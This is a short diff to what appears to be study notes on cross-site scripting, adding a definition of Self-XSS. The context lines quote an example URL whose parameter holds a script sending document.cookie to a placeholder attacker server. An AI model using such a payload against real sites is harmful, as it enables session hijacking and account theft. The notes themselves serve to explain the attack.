@@ -19,3 +19,4 @@
      * Can be embedded in fragments and URL parameters:
          * https://example.com#about_us
          * https://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>
+  * Self-XSS - a social engineering attack that tricks users into executing a XSS intructed by the attacker.
